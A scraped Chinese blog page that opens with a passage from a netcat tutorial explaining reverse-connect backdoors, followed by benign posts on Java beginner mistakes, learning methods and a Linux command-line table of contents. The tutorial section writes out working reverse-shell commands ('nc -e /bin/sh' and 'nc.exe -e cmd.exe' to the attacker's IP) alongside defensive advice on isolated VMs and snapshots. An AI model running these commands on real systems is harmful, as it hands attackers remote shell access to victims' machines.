<h2 id="★招数12：（入侵手法）用-nc-开启【主动】连接型后门"><a href="#★招数12：（入侵手法）用-nc-开启【主动】连接型后门" class="headerlink" title="★招数12：（入侵手法）用 nc 开启【主动】连接型后门"></a>★招数12：（入侵手法）用 nc 开启【主动】连接型后门</h2><h3 id="◇使用场景-11"><a href="#◇使用场景-11" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　为了打字省力，继续用【前一个章节】的场景。差别在于，你采纳了前一章节的措施——在某个 NAT 模式的虚拟机（Gest OS）中上网，以对付【被动】连接型的 nc 后门。<br>　　可惜的是——即便如此，入侵者在利用漏洞并获得“执行代码”的机会之后，还是有办法用 nc 在你的电脑上搞一个网络后门。<br>　　虽然你用了 NAT 模式的【虚拟机】（Guest OS），但入侵者可以用 nc 创建一个【主动】连接型的网络后门（这种玩法，有时也称作“反向连接”的后门）。</p>
<h3 id="◇原理-3"><a href="#◇原理-3" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　原理其实与“招数11”很类似，唯一的差别在于——把客户端与服务端【对调】。也就是说，攻击者手头的 nc 充当服务端，而受害者机器上的 nc 充当客户端。此时，受害者本机的 nc【无须】开启监听端口，【不受】防火墙的影响，也【不受】NAT 的影响。</p>
<h3 id="◇入侵方法-1"><a href="#◇入侵方法-1" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　既然 nc 的“服务端”与“客户端”对调。因此攻击者要先在自己机器上运行“服务端 nc”，命令如下（其中的 <code>xxx</code> 是端口号）。当然啦，攻击者自己电脑的防火墙需要允许 <code>xxx</code> 端口号对外监听。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -lk -p xxx</span><br></code></pre></td></tr></table></figure>

<p><strong>步骤2</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">xxx</span><br></code></pre></td></tr></table></figure>
<p>　　如果受害者是 POSIX 系统，则用如下命令：</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -e /bin/sh <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure>
<p>　　（在上述两个命令中， <code>xxx</code> 是步骤1用到的端口号，<code>x.x.x.x</code> 是攻击者的 IP 地址）</p>
<h3 id="◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机"><a href="#◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机" class="headerlink" title="◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机"></a>◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机</h3><p>　　所谓的【隔离模式】，指的是“Host Only 模式”或类似的模式（比如：“Internal 模式”）。<br>　　虽然当年那个系列讲的是【隐匿性】，但其中的【虚拟机隔离】，同样可以用来对付“主动连接型后门”。</p>
<p>　　有必要提醒一下：<br>　　【隔离的虚拟机】可以增加入侵者的攻击难度。但【不能】做到 100% 防范。<br>　　只要你能在某个隔离虚拟机中上网，那么——那些足够高级的木马，就【有可能】在隔离虚拟机中找到对外连接的通道。从而实现一个“【主动】连接型的后门”。<br>　　这下该咋办捏？<br>　　（在安全方面）虚拟机有两个【显著好处】——“网络隔离性”只是其中之一，另一个是【快照】。<br>　　如果你对安全性的要求【非常高】，要学会：<br>1、用“快照功能”建立【安全基线】<br>（所谓的【安全基线】就是说——在确保系统【纯洁】的时候，先做一个快照）<br>2、养成【定期回退快照】的好习惯<br>（就算你中了木马，只要一回退到【安全基线】，系统重新变得【纯洁】啦）</p>
<h3 id="◇“【主动】连接型后门”的优势之处（危险性之处）"><a href="#◇“【主动】连接型后门”的优势之处（危险性之处）" class="headerlink" title="◇“【主动】连接型后门”的优势之处（危险性之处）"></a>◇“【主动】连接型后门”的优势之处（危险性之处）</h3><p>　　简单对比一下“后门的两种连接方式”。</p>
<p><strong>可用性</strong><br>　　如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。<br>　　相比之下，“主动型后门”就【没有】这种弊端。</p>
<p><strong>隐蔽性</strong><br>　　“被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。<br>　　相比之下，“主动型后门”就【没有】这个问题。</p>
<h2 id="★附录：netcat-的【其它变种】"><a href="#★附录：netcat-的【其它变种】" class="headerlink" title="★附录：netcat 的【其它变种】"></a>★附录：netcat 的【其它变种】</h2><p>　　本文开头部分已经介绍了“原版 nc”以及“OpenBSD 变种”。在结尾部分，简单聊聊其它几个变种。</p>
<h3 id="◇GNU-netcat"><a href="#◇GNU-netcat" class="headerlink" title="◇GNU netcat"></a>◇GNU netcat</h3><p>　　官网在“<a target="_blank" rel="noopener" href="http://netcat.sourceforge.net/">这里</a>”。<br>　　从名称可以猜出：这是 GNU 社区对“原版 nc”的重写，以符合 GPL 许可协议。<br>　　按照它官网的说法，“GNU netcat”100% 兼容“原版 nc”的 1.10 版本。（注：1.10 版本是“原版 nc”用得最广的版本）</p>
<h3 id="◇ncat"><a href="#◇ncat" class="headerlink" title="◇ncat"></a>◇ncat</h3><p>　　这是 nmap 社区重写的 nc，其官网页面在“<a target="_blank" rel="noopener" href="https://nmap.org/ncat/">这里</a>”，帮助页面在“<a target="_blank" rel="noopener" href="https://nmap.org/ncat/guide/">这里</a>”。<br>　　它的口号是：Ncat - Netcat for the 21st Century<br>　　与“OpenBSD 变种”类似，它也增加了代理的支持。相比“OpenBSD 变种”，它的主要亮点是：完全支持 SSL/TLS。<br>　　由于它源自 nmap 社区，已经被包含在 nmap 软件包中（大多数 Linux ＆ BSD 发行版的官方仓库都有 nmap）</p>
<h3 id="◇socat"><a href="#◇socat" class="headerlink" title="◇socat"></a>◇socat</h3><p>　　在所有的变种里面，（据俺所知）这款可能是功能最强滴！但使用方法也有很大的不同（更复杂了）。感觉像是另一个全新的软件。<br>　　很多主流的 Linux 发行版已经包含它。<br>　　他也完全支持 SSL/TLS。</p>
<h3 id="◇Cryptcat"><a href="#◇Cryptcat" class="headerlink" title="◇Cryptcat"></a>◇Cryptcat</h3><p>　　一看名称就能猜到：这是“加密的网猫”。<br>　　由于大部分网猫都是直接在“裸 TCP”之上传输数据。如果传输的内容本身是明文，会遭遇【网络嗅探】的风险。<br>　　这款变种在传输过程中用 twofish 算法加密，以规避嗅探。</p>
<h3 id="◇sbd"><a href="#◇sbd" class="headerlink" title="◇sbd"></a>◇sbd</h3><p>　　光看这3字母的名称，你可能不知道这款变种的特色。<br>　　但如果俺告诉你：“sbd”是“Secure BackDoor”的缩写，你多半就猜到其特色了。<br>　　它的加密采用“AES-128-CBC + HMAC-SHA1”。</p>
<h3 id="◇netrw"><a href="#◇netrw" class="headerlink" title="◇netrw"></a>◇netrw</h3><p>　　这是专门针对“文件传输”功能进行强化和简化的变种。<br>　　【简化】方面<br>　　它分成两个命令：<code>netread</code> 和 <code>netwrite</code>，分别对应发送和接收。（相对“原版 nc”）省了几个命令选项。<br>　　【强化】方面<br>　　它会对传输过程进行散列校验，以防止传输的数据被篡改。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T15:43:01.000Z" title="2021/7/16 下午11:43:01">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:49:25.072Z" title="2021/7/16 下午11:49:25">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></span><span class="level-item">30 分钟读完 (大约4463个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/java%E6%96%B0%E6%89%8B%E7%9A%84%E9%80%9A%E7%97%85/">java新手的通病</a></h1><div class="content"><h1 id="数据结构和算法"><a href="#数据结构和算法" class="headerlink" title="数据结构和算法"></a>数据结构和算法</h1><p>为什么我先拿“数据结构和算法”说事捏？这玩意是写程序最最基本的东东。不管你使用 Java 还是其它的什么语言，都离不开它。而且这玩意是跨语言的，学好之后不管在哪门语言中都能用得上。</p>
<p>　　既然“数据结构和算法”这么重要，为什么很多 Java 新手却很不熟悉捏？我琢磨了一下，估计有两种可能。有些人虽然是计算机系毕业的，但是当初压根没好好学过这门课程，到工作时早都还给老师了；还有一些人是中途转行干编程，转行后又没有好好地打基础（都指望速成）。<br>　　下面我列出几个很基本的问题，如果你每一个问题都搞得很清楚，那说明你过了这关，可以去看看下一个帖子了。否则的话，你赶紧去找本算法和数据结构的书恶补一下吧。</p>
<p>★什么时候该用数组型容器、什么时候该用链表型容器？<br>★什么是散列函数？HashMap 的实现原理是什么？<br>★什么是递归？如果你以前从来没写过递归函数，尝试着写一个（比如用递归函数进行目录树遍历）。<br>★什么是算法复杂度？<br>★你是否理解空间换时间的思想？<br>★写一个针对整数数组的冒泡排序函数，看看你要修改几次才能跑通。<br>★写一个针对整数数组的二分查找函数，看看你要修改几次才能跑通。</p>
<h1 id="缺乏面向对象基本功"><a href="#缺乏面向对象基本功" class="headerlink" title="缺乏面向对象基本功"></a>缺乏面向对象基本功</h1><p>按理说 Java 是一个很 OO 的语言，Java 社区也一向是充满了“对象”的氛围。但俺在面试 Java 程序员时，却屡屡碰到令人大跌眼镜的事情。俺碰到不止一个求职者，连什么是“多态”都讲不清楚。很多人号称用过设计模式，但一半以上都仅限于单键模式和抽象工厂模式。当我深入问他/她抽象工厂模式到底有什么好处时，很多人语焉不详。</p>
<p>　　为什么很多 Java 程序员会缺乏面向对象基本功？这得怪那些 Java 框架。现在 Java 的各种框架太发达、太傻瓜化了，导致很多程序员只需要按部就班、照着框架进行代码填空，基本已经丧失了 OOA 和 OOD 的能力。我手下有些个 Java 程序员，对 Spring、Hibernate 等框架了如指掌；但如果给他一个简单需求，让他写一个脱离 Web 框架的独立 Application，他就不知所措了。这样的开发人员，将来只能成为所谓的“软件蓝领”，岗位很难得到提升。</p>
<p>　　同上文一样，我这次也提如下几个问题：<br>★基于接口的继承和基于实现的继承各有什么优缺点？<br>★继承（包括 extend 和 implement）有什么【缺点】？<br>★多态（polymorphism）有什么【缺点】？<br>★为什么 Java 可以多继承 interface，而不可以多继承 class？<br>★假如让你写一个小游戏（比如人机对战的五子棋），你会如何设计类结构？<br>★类结构设计时，如何考虑可扩展性？</p>
<p>　　如果上述这些问题你都能够搞得比较清楚，说明你的 OO 基础还过得去。否则的话，我建议你一边找些 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Object-oriented_analysis_and_design">OOAD</a> 和设计模式的书看看，同时自己动手写些简单的小程序（不依赖那些框架），把学到的模式理论结合到实践中。通过这种方式来提高自己 OOAD 的能力，效果会比较好。</p>
<h1 id="编程习惯"><a href="#编程习惯" class="headerlink" title="编程习惯"></a>编程习惯</h1><p>　上次聊了“缺乏面向对象基本功”，今天来说说编程习惯的问题。今天说的这些坏习惯大部分都是跨语言的（C++、Python 新手也有），而且大部分都需要靠平时不断地努力才能慢慢改掉。</p>
<h2 id="★随意地命名"><a href="#★随意地命名" class="headerlink" title="★随意地命名"></a>★随意地命名</h2><p>　　有些新手写程序，当需要定义某个变量名（也可能是函数名、类名、包名等）时，随意地一敲键盘，名字就起好了……若干星期后，碰到某 bug，再来看自己写的代码时，心中暗自嘀咕：“这代码是我写的吗？咋都看不懂捏？”<br>　　所以我常跟新来的菜鸟说，命名不规范害死人啊！鉴于该问题相当普遍，我整理了几种典型的作为反面教材，具体如下：使用单字母命名变量；使用一些没太大意义的变量名（例如 s1、s2、s3）；对同一个业务概念使用不同的术语/缩写（容易让读代码的人神经分裂）；使用拼音命名（如果你团队中有港台人士或者老外，就惨了）。</p>
<h2 id="★习惯于代码的-copy-amp-paste"><a href="#★习惯于代码的-copy-amp-paste" class="headerlink" title="★习惯于代码的 copy &amp; paste"></a>★习惯于代码的 copy &amp; paste</h2><p>　　这是一个很普遍的问题。很多新手写代码的时候，如果发现要写的某个函数和前几天写的某个函数差不多，就把原来的那个函数贴过来，然后稍微改几下，心中还暗喜：“又快速搞定了一个功能”……<br>　　同学，如果你也喜欢这么干，可要注意了。这种做法是代码臭味（借用《重构 - 改善既有代码的设计》的提法）的主要来源，导致代码可维护性大大下降。当你将来需要增加功能或修改 bug 的时候，要同时改动多个地方，而那时你估计已经想不起来这砣代码有几个克隆了。</p>
<h2 id="★Magic-Number-满天飞"><a href="#★Magic-Number-满天飞" class="headerlink" title="★Magic Number 满天飞"></a>★Magic Number 满天飞</h2><p>　　如果你没有听说过“Magic Number”，先看“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Magic_number_(programming)#Unnamed_numerical_constant">这里</a>”了解一下。<br>为了说明Magic Number的问题，咱找个例子来说事儿：假设有个业务逻辑中需要进行10秒的超时等待，你会怎么写这个sleep语句？我估计大部分人不外乎下面三种写法：<br>1、直接写上 <code>sleep(10*1000);</code> 了事<br>2、定义一个常量 <code>TIMEOUT_XXX = 10*1000;</code> 然后 <code>sleep(TIMEOUT_XXX);</code><br>3、在配制文件中加入一个超时项，然后程序读取配制文件获得超时值，然后调用 sleep。（此处提到的“配置文件”是广义的，泛指各种可用于存储配置信息的机制，如：xml 文件、ini 文件、数据库 …）<br>　　如果你的做法类似于写法1，你多半喜欢随手硬编码。硬编码不光缺乏可读性，而且具有和“代码拷贝粘贴”类似的代码臭味（可能会存在多个 Magic Number 克隆），不利于日后维护。<br>　　至于写法2，比写法1稍好（至少可读性好了）。但是，将来一旦发生需求变更，要求在【运行时】调整超时间隔（甚至要求让用户来配制超时间隔），则写法2的缺点立马暴露无遗。</p>
<h2 id="★代码耦合度太大"><a href="#★代码耦合度太大" class="headerlink" title="★代码耦合度太大"></a>★代码耦合度太大</h2><p>　　每当说到 MVC 或者设计模式，几乎每个 Java 开发人员都能说得头头是道？但是说归说，真正写代码的时候，鲜有人写出的代码是层次清楚的。至于说到代码耦合分别由哪些情况引起？什么是正交的设计？（关于耦合与正交设计，我后面会专门讨论一下）能完全搞明白的人就更少了。<br>　　所以很多 Java 新手的代码耦合度大也就不足为奇了。我曾经抽查过试用期员工的代码，各种业务逻辑纠缠在一起，代码臭味都要熏死人。想重构都无从下手，只好让他推倒重写。</p>
<h2 id="★被-GC-宠坏"><a href="#★被-GC-宠坏" class="headerlink" title="★被 GC 宠坏"></a>★被 GC 宠坏</h2><p>　　由于 Java 在语言层面提供了内存的垃圾回收机制，程序员只管申请内存，不需要再关心释放的问题。因此很多新手养成了坏习惯，对于其它资源（比如数据库连接）也只申请不释放（有些人甚至天真地以为 JVM 会帮你搞定资源回收）。<br>　　还有些人虽然知道资源需要释放，但是常常忘记（比如写了打开数据库连接和相关代码，【即将】写关闭数据库连接时，突然有人叫你去吃中饭，回来后就把这茬给忘了）。<br>　　这个坏习惯会导致资源的泄露，而资源泄露往往比内存泄露更要命。如果你写的程序是长时间运行的（比如运行在 Web Server 上），时间长了会由于资源耗尽而导致整个进程出问题。</p>
<h1 id="异常处理不当"><a href="#异常处理不当" class="headerlink" title="异常处理不当"></a>异常处理不当</h1><p>上文讨论了“编程习惯的问题”，今天来聊聊关于异常处理的话题。</p>
<h2 id="★空的-catch-语句块"><a href="#★空的-catch-语句块" class="headerlink" title="★空的 catch 语句块"></a>★空的 catch 语句块</h2><p>　　犯这种错误的人比较少，一般发生在刚学会 Java 或者刚参加工作不久的人身上。<br>　　所谓“空 catch 语句块”就是在 catch 语句块中没有对异常作任何处理（比如记错误日志），导致异常信息被丢弃/忽略。一旦程序不能正确运行，由于查不到任何 log 信息，只好从头看代码，靠肉眼找 bug。</p>
<h2 id="★没有使用-finally"><a href="#★没有使用-finally" class="headerlink" title="★没有使用 finally"></a>★没有使用 finally</h2><p>　　很多人在 catch 语句之后不使用 finally 语句。由于在 try 语句中可能会涉及资源的申请和释放。如果在资源申请之后、资源释放之前抛出异常，就会发生资源泄露。<br>　　（资源泄露的严重性，上文已经聊过了）</p>
<h2 id="★笼统的-catch-语句块"><a href="#★笼统的-catch-语句块" class="headerlink" title="★笼统的 catch 语句块"></a>★笼统的 catch 语句块</h2><p>　　有些人为了省事，只在自己模块的最外层代码包一个 try 语句块，然后 catch(Exception)。不管捕获到什么异常，都作统一 log 了事。这种做法比“空 catch 语句块”稍好，但由于不能对具体的异常进行具体处理，对一些可恢复的异常（下面会提到），丧失了恢复的机会。而且也可能导致上述提到的资源泄露的问题。</p>
<h2 id="★使用函数返回值进行错误处理"><a href="#★使用函数返回值进行错误处理" class="headerlink" title="★使用函数返回值进行错误处理"></a>★使用函数返回值进行错误处理</h2><p>　　有些人放着 Java 的异常机制不用，而用函数返回值来表示成功/失败（比如：返回 true 表示成功、false 表示失败），简直是“捧着金碗要饭”。个人感觉，从 C 转到 Java 的人比较容易有此毛病。这种做法会导致如下几个问题：<br>\1. 返回值一般用整数值或布尔值表示，传递的信息过于简陋；<br>\2. 一旦调用者忽略了错误返回码，就会导致和“空 catch 语句块”类似的问题；<br>\2. 对同一个函数的多处调用，都需要对返回值进行重复判断，导致代码冗余（代码冗余的坏处，上文也已经聊过了）。</p>
<h2 id="★不清楚“Checked-Exception”和“Runtime-Exception”的区别"><a href="#★不清楚“Checked-Exception”和“Runtime-Exception”的区别" class="headerlink" title="★不清楚“Checked Exception”和“Runtime Exception”的区别"></a>★不清楚“Checked Exception”和“Runtime Exception”的区别</h2><p>　　这个现象比较普遍，俺发现很多2年以上 Java 工作经验的人尚未完全搞明白两者的区别。看来这个问题得详细说一下。<br>当初Java的设计者有意区分这两种异常，是别有深意的。其中“Checked Exception”用于表示可恢复的异常（也就是你必须检查的异常）；而“Runtime Exception”表示不可恢复的异常（也就是运行时异常，主要是程序 bug 和致命错误，你【不需要】检查）。不过这种做法引来了很多争议（包括很多 Java 大牛），鉴于本帖子主要针对新手，以后再专门来聊这个争议的话题。<br>　　为了便于理解，下面我举一个例子来说明。假设你要写一个 Download 函数，根据传入的 URL（String 参数）返回对应网页的内容文本。这时候有两种情况你需要处理：<br>\1. 如果传入的 URL 参数是 null，这表明该函数的调用者出 bug 了，而程序本身的 bug 是很难在运行时自我恢复的。这时候 Download 函数必须抛出 Runtime Exception。并且 Download 函数的调用者【不应该】尝试去处理这个异常，必须让它【尽早】暴露出来（比如让 JVM 自己终止运行）。<br>\2. 如果传入的 URL 参数非 null，但是它包含的字符串不是一个合法的URL格式（可能由于用户输入错误导致）。这时候 Download 函数必须抛出 Checked Exception。并且 Download 函数的调用者必须捕获该异常并进行相应的处理（比如提示用户重新输入 URL）。</p>
<p>上面就是几种常见的Java异常处理的误用。下一次我们来聊一下“对虚拟机（JVM）了解不足”。</p>
<h1 id="对JVM缺乏了解"><a href="#对JVM缺乏了解" class="headerlink" title="对JVM缺乏了解"></a>对JVM缺乏了解</h1><p>上文讨论了Java异常机制的几种误用，今天咱们来说说 JVM（以及 Java 编译器）相关的话题。为啥要聊 JVM 捏？因为有很多 Java 程序员，由于对 JVM 缺乏了解，在碰到某些技术问题时无从下手；另外，由于缺乏对 JVM 的了解，可能导致写出来的代码性能巨差或者有严重的 Bug。对于一个 Java 程序员来说，你不一定要非常清楚 JVM 的细节，但是对于一些关键的运作机制，还是要掌握大致的概念。<br>　　按照本系列的惯例，俺会问几个和 JVM 相关的问题，你如果对这些问题不是很明白，那得考虑花点时间去了解一下了。另外，鉴于有网友批评“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/01/defect-of-java-beginner-0-overview.html">本系列</a>”帖子：光诊断毛病，不开出药方。（说得很形象，也很中肯）俺会针对下面提出的问题，写一些帖子来解答。</p>
<h2 id="★关于基本类型和引用类型"><a href="#★关于基本类型和引用类型" class="headerlink" title="★关于基本类型和引用类型"></a>★关于基本类型和引用类型</h2><p>很多新手不理解Java的基本类型和引用类型在本质上有什么区别。请看如下的问题：<br>◇这两种类型在内存存储上有什么区别？<br>◇这两种类型在性能上有什么区别？<br>◇这两种类型对于 GC 有什么区别？</p>
<h2 id="★关于垃圾回收（Garbage-Collection）"><a href="#★关于垃圾回收（Garbage-Collection）" class="headerlink" title="★关于垃圾回收（Garbage Collection）"></a>★关于垃圾回收（Garbage Collection）</h2><p>　　很多新手不理解 GC 的实现机制。请看如下的问题：<br>◇GC 是如何判断哪些对象已经失效？<br>◇GC 对性能会有哪些影响？<br>◇如何通过 JVM 的参数调优 GC 的性能？</p>
<h2 id="★关于字符串"><a href="#★关于字符串" class="headerlink" title="★关于字符串"></a>★关于字符串</h2><p>　　对于 Java 提供的 String 和 StringBuilder，想必很多人都知道：String 用于常量字符串，StringBuilder 用于可变字符串。那 Java 当初为什么要这样设计捏？为啥不用一个类来统一搞定捏？</p>
<h2 id="★关于范型（Generic-Programming）"><a href="#★关于范型（Generic-Programming）" class="headerlink" title="★关于范型（Generic Programming）"></a>★关于范型（Generic Programming）</h2><p>　　从 JDK 1.5开始，Java 引入了一个重量级的语法：范型。不过捏，很多新手仅仅知道范型的皮毛，而对于很多本质的东东，不甚了解。<br>◇GP 是在编译时实现的还是在运行时实现的？为什么要这么实现？<br>◇GP 的类型擦除机制是咋回事？有啥优点/缺点？<br>◇使用范型容器（相对于传统容器）在性能上有啥影响？为什么？</p>
<h2 id="★关于多线程"><a href="#★关于多线程" class="headerlink" title="★关于多线程"></a>★关于多线程</h2><p>　　另外，多线程也是大部分 Java 新手的短板。所以俺最后再来提几个关于多线程的问题。<br>◇synchronized 关键字是怎么起作用滴？<br>◇synchronized 的颗粒度（或者说作用域）如何？是针对某个类还是针对某个类对象实例？<br>◇synchronized 对性能有没有影响？为什么？<br>◇volatile 关键字又是派啥用滴？啥时候需要用这个关键字捏？</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T15:31:58.000Z" title="2021/7/16 下午11:31:58">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:34:06.779Z" title="2021/7/16 下午11:34:06">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></span><span class="level-item">10 分钟读完 (大约1461个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF%E4%B8%89%E9%83%A8%E6%9B%B2/">学习技术三部曲</a></h1><div class="content"><h1 id="学习技术的三部曲：WHAT、HOW、WHY"><a href="#学习技术的三部曲：WHAT、HOW、WHY" class="headerlink" title="学习技术的三部曲：WHAT、HOW、WHY"></a>学习技术的三部曲：WHAT、HOW、WHY</h1><p><strong>文章目录</strong></p>
<p>★第一步：WHAT<br>★第二步：HOW<br>★第三步：WHY</p>
<p>　　最近几天有些网友在邮件里面问我关于学习的问题。有好几个人觉得工作了几年，也学会了不少的类库、框架、甚至语言，但是感觉自己的能力没有太大的提高。因此今天来说一下我个人对这方面的体会，希望对大伙儿（尤其是新手）有帮助。<br>　　先声明一下，本帖子讨论的三部曲是指你已经选定了某个技术方向之后，该如何学习；至于如何选定技术方向，则属于另一个话题，不在今天的讨论之列。<br>　　我把学习归类为三个步骤：What、How、Why。经过我对周围同事和朋友的观察，大部分感觉自己技术没有提高的人，都仅仅停留在 WHAT 阶段。下面我把这三个步骤解释一下。</p>
<h2 id="★第一步：WHAT"><a href="#★第一步：WHAT" class="headerlink" title="★第一步：WHAT"></a>★第一步：WHAT</h2><p>　　所谓的“WHAT”也就是“What is it?”——这是最简单的层次。在这个层次，你要搞清楚某个东东是【什么】样子的？有【什么】用处？有【什么】特性？有【什么】语法？……<br>　　举例如下：</p>
<blockquote>
<p>对于学习语言（比如 C++、Java、Python），大部分人都能够掌握基本的语法和标准库，然后用它写一些小程序（诸如二分查找、冒泡排序、简单文件操作等）。<br>对于学习类库（比如 JDBC 类库），大部分 Java 程序员都能明白 JDBC 主要包含哪些类，也能够用 JDBC 进行简单的数据库查询和增删改操作。</p>
</blockquote>
<p>　　由于这个步骤是最基本的，假如你连这都做不到（可能你的理解力不够好），也别在 IT 行业混了。<br>　　但是光会 What 是不够的。仅仅停留在这个步骤，导致了很多程序员【只知其然，不知其所以然】。这就是目前大部分开发人员的现状。</p>
<h2 id="★第二步：HOW"><a href="#★第二步：HOW" class="headerlink" title="★第二步：HOW"></a>★第二步：HOW</h2><p>　　所谓的“HOW”就是“How to do?”。在这个层次，你要搞清楚某个东西，其内部是【如何】运作的？【如何】实现的？……<br>　　举例如下：</p>
<blockquote>
<p>假如你在学习 C++ 语言，你是否搞明白函数传参数的实现机制？虚函数是如何实现？抛出异常时的栈回退是怎么回事？……<br>假如你在学习 Java 语言，你是否搞清楚 GC 如何实现？反射是如何实现？……<br>假如你在学习 JDBC 库，你是否清楚 JDBC Driver 的4种类型？不同游标类型的实现机制？事务的机制？……</p>
</blockquote>
<p>　　在这个阶段，你必须多想想类似这些问题。然后通过各种途径（参见“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/01/2.html">关于自学能力</a>”的几个方法），把问题彻底搞清楚。自然而然，你的提高就会比较明显。而且如果碰到一些深层次的问题（比如性能优化），也就知道该如何去解决。<br>　　完成这个阶段之后，你基本上就属于该技术领域最优秀的20%的人（根据<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2009/02/80-20-principle-0-overview.html">二八原理</a>，80%的人不会去思考 HOW 的问题）。</p>
<h2 id="★第三步：WHY"><a href="#★第三步：WHY" class="headerlink" title="★第三步：WHY"></a>★第三步：WHY</h2><p>　　一般来说，只有想清楚 HOW 之后，才能继续去考虑 WHY。<br>　　所谓的“WHY”，就是搞清楚某个东西【为什么】设计成这样？【为什么】不是另外的样子？这样的设计有什么讲究？……<br>　　说实在的，善于问“为什么”有一定的天赋成分？好像某个科学大牛曾经说过“提出问题有时候比解决问题更难”。一般来说，只有当你【深刻理解】了某个东西，才能够针对这个东东的【设计】问出一些问题。所以，我前面强调过，要先把 HOW 的问题搞清楚，再来考虑 WHY 的问题。<br>　　举例如下：</p>
<blockquote>
<p>对于C++语言：为什么 C++ 没有类似 Java 的 finally 关键字？为什么当初发明 C++ 的时候没有考虑 GC？……<br>对于Java语言：为什么 Java 没有类似 C++ 的类析构函数？为什么 Java 要同时提供 String 和 StringBuffer 两个似乎冗余的类？……<br>对于Python语言：为什么 Python 不提供类似 C++/Java 的访问控制机制？……</p>
</blockquote>
<p>　　如果你能够【自己】问出诸如上述的“为什么”问题，并且能够通过各种途径找到解答，那你基本上已经吃透这个技术了，并且你已经【有可能】自己去【设计】一个类似的玩意儿了。到这时，你已经踏上了通向技术高手的康庄大道。</p>
<p>　　由于本博客偏重 IT 方面，所以今天举的这些例子多半都是 IT 相关的。但这个“三部曲”在 IT 之外的行业和领域，其实也适用。如何举一反三，就看各位的悟性了。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T13:48:51.000Z" title="2021/7/16 下午9:48:51">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:27:52.410Z" title="2021/7/16 下午11:27:52">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/">编程随想</a></span><span class="level-item">2 小时读完 (大约17564个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/Linux-%E5%91%BD%E4%BB%A4%E8%A1%8C/">Linux&amp;命令行</a></h1><div class="content"><h1 id="扫盲-Linux＆UNIX-命令行——从“电传打字机”聊到“shell-脚本编程”"><a href="#扫盲-Linux＆UNIX-命令行——从“电传打字机”聊到“shell-脚本编程”" class="headerlink" title="扫盲 Linux＆UNIX 命令行——从“电传打字机”聊到“shell 脚本编程”"></a>扫盲 Linux＆UNIX 命令行——从“电传打字机”聊到“shell 脚本编程”</h1><p><strong>文章目录</strong></p>
<p>★引子<br>★本文目标读者<br>★一切都从【电传打字机】开始说起<br>★终端（terminal/TTY）<br>★终端的3种【缓冲模式】——字符模式、行模式、屏模式<br>★终端的【回显】<br>★（早期的）系统控制台/物理控制台（system console）<br>★（如今的）虚拟控制台（virtual console）<br>★终端模拟器（terminal emulator）<br>★伪终端（PTY/pseudotty/pseudoterminal）<br>★shell——命令行解释器<br>★shell 的基本功能<br>★进程的启动与退出<br>★“进程控制”与“信号”<br>★作业控制（job）<br>★环境变量（environment variable）<br>★“标准流”（standard stream）与“重定向”（redirection）<br>★匿名管道（anonymous pipe）<br>★批处理（batch）<br>★shell 脚本<br>★结尾</p>
